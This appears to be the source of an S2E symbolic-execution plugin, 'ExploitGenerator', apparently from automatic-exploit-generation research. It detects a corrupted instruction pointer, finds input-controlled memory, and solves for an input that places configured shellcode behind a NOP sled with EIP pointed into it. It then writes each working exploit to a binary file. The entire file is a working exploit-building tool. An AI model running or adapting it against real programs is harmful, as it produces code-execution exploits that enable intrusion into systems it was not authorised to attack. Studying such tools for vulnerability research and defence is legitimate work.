#include <algorithm>
#include <fstream>
#include <vector>
#include <s2e/S2E.h>
#include <s2e/S2EExecutor.h>
#include <s2e/Utils.h>
#include <s2e/ConfigFile.h>
#include <klee/Solver.h>
#include <klee/util/ExprUtil.h>
#include "ExploitGenerator.h"

using namespace std;

namespace s2e {
namespace plugins {

S2E_DEFINE_PLUGIN(ExploitGenerator,
                  "Exploit Vulnerabilities",
                  "Exploit Generator",);

void ExploitGenerator::initialize()
{
    m_shellCode = s2e()->getConfig()->getString(getConfigKey() + ".shellCode");
    /**
     * XXX: Generate correct shellcode
     * getString() escapes backslashes, thus, '\x61' becomes "x61"
     */
    m_shellCode = str2byte(m_shellCode);
    s2e()->getMessagesStream() << "ShellCode size: "
                               << m_shellCode.size() << "\n";

    m_startTime = 0;
    m_endTime = 0;
    m_exploreTime = 0;

    s2e()->getCorePlugin()->onEipCorrupt.connect(
            sigc::mem_fun(*this, &ExploitGenerator::onEipCorrupt));

    /**
     * XXX: The timer starts to count when the first translation block is
     *      dispatched to klee. It will better to start immediately when the
     *      target application starts.
     */
    s2e()->getCorePlugin()->onKleeExecutionStart.connect(
            sigc::mem_fun(*this, &ExploitGenerator::timerStart));
    s2e()->getCorePlugin()->onStateKill.connect(
            sigc::mem_fun(*this, &ExploitGenerator::timerStop));
}

void ExploitGenerator::onEipCorrupt(
        S2EExecutionState *state,
        klee::ref<klee::Expr> eipValue)
{
    /* Address of the beginning of an object */
    set<uint64_t> taintedAddressSet;
    /**
     * first:  start address of a consecutive symbolic data
     * second: width of the symbolic data
     */
    map<uint64_t, uint64_t> symbolicArrayMap;

    m_eipValue = eipValue;

    s2e()->getMessagesStream(state) << "EIP is tainted by "
        << s2e()->getExecutor()->toConstantSilent(*state, m_eipValue)
        << ", original value is " << m_eipValue << "\n";

    time(&m_exploreTime);
    s2e()->getMessagesStream(state) << "Explore Time: "
        << (int)difftime(m_exploreTime, m_startTime) << " seconds" << '\n';

    s2e()->getMessagesStream(state) << state->constraints.size()
        << " constraints in the state" << '\n';

    klee::ConstraintManager::constraint_iterator
            it = state->constraints.begin();
    for (; it != state->constraints.end(); it++) {
        s2e()->getDebugStream(state) << (*it) << '\n';
    }

    findTaintedObjects(state, 0x00000000, 0xC0000000, &taintedAddressSet);
    findSymbolicArray(state, taintedAddressSet, &symbolicArrayMap);

    map<uint64_t, uint64_t>::iterator it_symbolicArray;
    for (it_symbolicArray = symbolicArrayMap.begin();
            it_symbolicArray != symbolicArrayMap.end(); it_symbolicArray++) {
        generateExploit(state,
            /* startAddress = */ it_symbolicArray->first,
            /* width = */ it_symbolicArray->second);
    }

    klee::ExecutionState *kleeState =
        static_cast<klee::ExecutionState*>(state);
    s2e()->getExecutor()->terminateStateEarly(*kleeState,
                                              "Ended exploit generating");
}

void ExploitGenerator::timerStart(S2EExecutionState *state)
{
    if (m_startTime != 0) {
        return;
    }
    else {
        time(&m_startTime);
        s2e()->getMessagesStream(state) << "Timer starts" << '\n';
    }

    return;
}

void ExploitGenerator::timerStop(S2EExecutionState *state)
{
    time(&m_endTime);
    s2e()->getMessagesStream(state) << "Timer ends, took "
        << (int)difftime(m_endTime, m_startTime) << " seconds" << '\n';

    return;
}


void ExploitGenerator::findTaintedObjects(
        S2EExecutionState *state,
        uint64_t minAddress,
        uint64_t maxAddress,
        set<uint64_t> *taintedAddressSet)
{
    uint64_t hostAddress = 0;
    klee::ObjectPair op;

    for (uint64_t i_pageNumber = minAddress; i_pageNumber <= maxAddress;
            i_pageNumber += TARGET_PAGE_SIZE) {

        /* invalid page fault */
        if (likely(state->getPhysicalAddress(i_pageNumber) == (uint64_t) -1)) {
            continue;
        }

        for (uint64_t j_objectStartAddress = i_pageNumber;
                j_objectStartAddress <= i_pageNumber + TARGET_PAGE_SIZE;
                j_objectStartAddress += S2E_RAM_OBJECT_SIZE) {

            hostAddress = state->getHostAddress(j_objectStartAddress);

            if (hostAddress == (uint64_t) -1) {
                continue;
            }

            op = state->addressSpace.findObject(hostAddress);
            if (op.second->isAllConcrete()) {
                continue;
            }

            taintedAddressSet->insert(j_objectStartAddress);
        }
    }
}

void ExploitGenerator::findSymbolicArray(
        S2EExecutionState *state,
        set<uint64_t> const& taintedAddressSet,
        map<uint64_t, uint64_t> *symbolicArrayMap)
{
    klee::ObjectPair op;
    const klee::MemoryObject *mo;
    const klee::ObjectState *os;

    bool isPreviousByteConstant = true;
    uint64_t startAddress = 0, width = 0;

    set<uint64_t>::iterator it_objectStartAddress;
    for (it_objectStartAddress = taintedAddressSet.begin();
            it_objectStartAddress != taintedAddressSet.end();
            it_objectStartAddress++) {

        op = state->addressSpace.findObject(
             state->getHostAddress(*it_objectStartAddress));
        mo = op.first;
        os = op.second;

        uint64_t i_pageOffset = mo->address & ~S2E_RAM_OBJECT_MASK;
        for (; i_pageOffset < mo->size; i_pageOffset++) {

            klee::ref<klee::Expr> byte = os->read8(i_pageOffset);
            if (!isa<klee::ConstantExpr>(byte)) {
                /* Start of a symbolic array */
                if (isPreviousByteConstant) {
                    startAddress = *it_objectStartAddress | i_pageOffset;
                    width = 1;
                }
                else {
                    width++;
                }
                isPreviousByteConstant = false;
            }
            else {
                /* End of a symbolic array */
                if (!isPreviousByteConstant) {
                    s2e()->getMessagesStream(state)
                        << "Found Symbolic Array at " << hexval(startAddress)
                        << ", width " << width << "\n";
                    symbolicArrayMap->insert(make_pair(startAddress, width));
                }
                isPreviousByteConstant = true;
                continue;
            }
        }
    }
}

void ExploitGenerator::pruneInputConstraints(
        S2EExecutionState *state,
        klee::ExecutionState *exploitState)
{
    std::vector< klee::ref<klee::Expr> >
        pathConstraints(state->constraints.size());
    std::vector< klee::ref<klee::Expr> >::iterator it;

    it = std::set_difference(state->constraints.begin(),
                             state->constraints.end(),
                             state->inputConstraints.begin(),
                             state->inputConstraints.end(),
                             pathConstraints.begin());

    pathConstraints.resize(it - pathConstraints.begin());

    exploitState->constraints =
        *(new klee::ConstraintManager(pathConstraints));

    s2e()->getMessagesStream(state) << "Pruned "
        << state->inputConstraints.size() << " out of "
        << state->constraints.size() << " constraints\n";
}

klee::ref<klee::Expr> ExploitGenerator::generateConstraints(
        S2EExecutionState *state,
        uint64_t startAddress,
        uint64_t shellCodeAddress,
        uint64_t nopAttempt,
        uint64_t failedPivot,
        uint64_t successPivot)
{
    klee::ref<klee::Expr> byte, eipConstraint, exploitConstraint;

    exploitConstraint = klee::ConstantExpr::create(0x1, klee::Expr::Bool);

    /* shellcode constraint */
    for (int i = 0; i < m_shellCode.size(); i++) {
        byte = klee::EqExpr::create(
                state->readMemory8(
                    shellCodeAddress + i),
                    klee::ConstantExpr::create(
                        (uint8_t)m_shellCode[i], klee::Expr::Int8));
        exploitConstraint = klee::AndExpr::create(exploitConstraint, byte);
    }

    /* nop sled constraint */
    for (int i = 0; i < shellCodeAddress - nopAttempt; i++) {
        byte = klee::EqExpr::create(state->readMemory8(nopAttempt + i),
                klee::ConstantExpr::create(0x90, klee::Expr::Int8));
        exploitConstraint = klee::AndExpr::create(exploitConstraint, byte);
    }

    /* eip constraint, eip >= lowerBound && eip <= upperBound */
    uint64_t lowerBound = nopAttempt;
    uint64_t upperBound = shellCodeAddress;
    eipConstraint = klee::AndExpr::create(
            klee::UgeExpr::create(m_eipValue,
                klee::ConstantExpr::create(lowerBound, klee::Expr::Int64)),
            klee::UleExpr::create(m_eipValue,
                klee::ConstantExpr::create(upperBound, klee::Expr::Int64)));
    exploitConstraint = klee::AndExpr::create(
            exploitConstraint, eipConstraint);

    klee::Solver *solver = s2e()->getExecutor()->getSolver();
    bool isTrue;
    solver->mayBeTrue(
            klee::Query(state->constraints, exploitConstraint), isTrue);

    if (isTrue) {
        successPivot = nopAttempt;
        uint64_t nextAttempt = (failedPivot + successPivot) / 2;

        if (isPivotsOverlapped(failedPivot, successPivot)) {
            s2e()->getMessagesStream(state) << "ShellCode starts at "
                                            << hexval(shellCodeAddress)
                                            << ", width "
                                            << m_shellCode.size() << "\n";

            s2e()->getMessagesStream(state) << "NOP sled starts at "
                                            << hexval(nopAttempt)
                                            << ", width "
                                            << shellCodeAddress - nopAttempt
                                            << "\n";

            s2e()->getMessagesStream(state) << "Set EIP between "
                                            << hexval(lowerBound) << " and "
                                            << hexval(upperBound) << "\n";

            return exploitConstraint;
        }
        else {
            return generateConstraints(state, startAddress,
                    shellCodeAddress, nextAttempt, failedPivot, successPivot);
        }
    }
    else {
        failedPivot = nopAttempt;
        uint64_t nextAttempt = (failedPivot + successPivot) / 2;

        if (isPivotsOverlapped(failedPivot, successPivot)) {
            return klee::ConstantExpr::create(0, klee::Expr::Bool);
        }
        else {
            return generateConstraints(state, startAddress,
                    shellCodeAddress, nextAttempt, failedPivot, successPivot);
        }
    }
}

void ExploitGenerator::generateExploit(
        S2EExecutionState *state,
        uint64_t startAddress, uint64_t width)
{
    if (width < m_shellCode.size()) {
        s2e()->getDebugStream(state) << "No enough space on symbolic array"
                                     << hexval(startAddress) << ", "
                                     << width << " < "
                                     << m_shellCode.size() << '\n';
        return;
    }

    s2e()->getMessagesStream(state) << "Generating exploit on symbolic array "
                                    << hexval(startAddress) << '\n';

    klee::ref<klee::Expr> exploitConstraint;

    uint64_t solutionNum = width - m_shellCode.size() + 1;
    for (uint64_t i = 0; i < solutionNum; i++) {
        uint64_t shellCodeOffset = solutionNum - i - 1;

        exploitConstraint = generateConstraints(state, startAddress,
                /* shellCodeAddress = */ startAddress + shellCodeOffset,
                /* nopAttempt = */ startAddress,
                /* failedPivot = */ startAddress,
                /* successPivot = */ startAddress + shellCodeOffset);

        if (!exploitConstraint->isZero()) {
            klee::ExecutionState* exploitState =
                new klee::ExecutionState(*state);
            pruneInputConstraints(state, exploitState);

            exploitState->addConstraint(exploitConstraint);

            ConcreteInputs out;
            bool hasSolution;
            hasSolution =
                s2e()->getExecutor()->getSymbolicSolution(*exploitState, out);

            if (!hasSolution) {
                s2e()->getWarningsStream()
                    << "Could not get symbolic solutions\n";
            }
            else {
                stringstream filename;
                filename << "exploit-"
                         << std::hex << startAddress << ".bin";

                s2e()->getMessagesStream(state) << "Write exploit to file "
                                                << filename.str() << '\n';

                std::ofstream fs(
                        s2e()->getOutputFilename(filename.str()).c_str(),
                        std::ios::out | std::ios::binary);

                const VarValuePair &vp = out.front();

                for (unsigned i = 0; i < vp.second.size(); ++i) {
                    fs.put((unsigned)vp.second[i]);
                }

                fs.close();
                return;
            }
        }
    }

    s2e()->getMessagesStream(state)
        << "Could not generate exploit on symbolic array "
        << hexval(startAddress) << '\n';
}

/**
 * input:  "x61x62x63"
 * output: "\x61\x62\x63"
 */
string ExploitGenerator::str2byte(string str) {
    char buf[3] = {'\0'};
    char chr = '\0';
    string byteString;

    for (int i = 0; i < str.size(); i += 3) {
        sprintf(buf, "%c%c", str[i + 1], str[i + 2]);
        chr = strtol(buf, NULL, 16);
        byteString.push_back(chr);
    }

    return byteString;
}

} // namespace plugins
} // namespace s2e
